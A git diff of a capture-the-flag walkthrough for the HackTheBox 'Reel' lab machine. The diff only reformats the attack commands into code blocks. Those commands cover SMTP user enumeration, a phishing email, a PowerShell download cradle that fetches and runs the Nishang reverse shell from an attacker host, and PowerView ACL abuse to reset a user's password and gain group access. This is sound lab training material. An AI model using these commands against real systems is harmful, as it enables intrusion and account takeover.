@@ -105,7 +105,9 @@ we give it a list of male/female names from the **SecLists** Github Repo to try 
 
 the command is:
 
-`smtp-user-enum -M VRFY -U users.txt -t 10.10.10.77`
+```bash
+smtp-user-enum -M VRFY -U users.txt -t 10.10.10.77
+```
 
 That takes a while to run. And it comes up short. *So we move on...*
 
@@ -169,7 +171,7 @@ We're going to use the `sendEmail` command with a couple flags:
 - `-m <MESSAGE_BODY>`
 
 Our command is:
-```
+```bash
 sendEmail \
 -t nico@megabank.com \
 -f review@megabank.com \
@@ -212,7 +214,9 @@ This is why we generated an `HTA` payload using `msfvenom` instead.
 
 Switching to **PowerShell** from **CMD** can be done with the below command using the famous **Nishang shell** (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) adding the `Invoke-PowerShellTcp` call at the bottom of the `.ps1`
 
-`powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/nishang.ps1')"`
+```shell
+powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/nishang.ps1')"
+```
 
 *To run the* `Invoke-BloodHound` *method*, We import the `SharpHound.ps1` script into memory using the same we ran `Nishang.ps1`:
 
@@ -244,9 +248,15 @@ This is because the `herman` user has a `WriteDACL` right over it.
 
 ![set-dom-obj-owner](/assets/Reel/set-dom-obj-owner.jpg)
 
-**Command:** `Set-DomainObjectOwner -Identity herman -OwnerIdentity nico`
+**Command:** 
+```powershell
+Set-DomainObjectOwner -Identity herman -OwnerIdentity nico
+```
 
-We will need to follow up with `Add-DomainObjectAcl -TargetIdentity herman -PrincipalIdentity nico -Rights ResetPassword`
+We will need to follow up with:
+```powershell
+Add-DomainObjectAcl -TargetIdentity herman -PrincipalIdentity nico -Rights ResetPassword
+```
 
 ![add-dom-object-acl](/assets/Reel/add-dom-object-acl.jpg)
 
@@ -256,11 +266,15 @@ And set the password for `herman` using `Set-DomainUserPassword`
 
 We create a `secure string` object using:
 
-`$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force`
+```powershell
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+```
 
 and set the password:
 
-`Set-DomainUserPassword -Identity herman -AccountPassword $UserPassword`
+```powershell
+Set-DomainUserPassword -Identity herman -AccountPassword $UserPassword
+```
 
 ### Logging in as herman and joining the `backup_admins` group
 
@@ -276,7 +290,7 @@ and we can add ourselves to the `backup_admins` group easily with `Add-ADGroupMe
 
 We first *relog* to *refresh our access* and check our newly-found acccess using `PowerShell`:
 
-```
+```powershell
 $ErrorActionPreference = 'silentlycontinue'
 ls -recurse -force | ? {$_.fullname -notmatch 'AppData|Application Data|Local Settings'} | ? {(get-acl $_.fullname ).accesstostring -like '*Backup_admins*'} | select -expand fullname
 $ErrorActionPreference = 'continue'
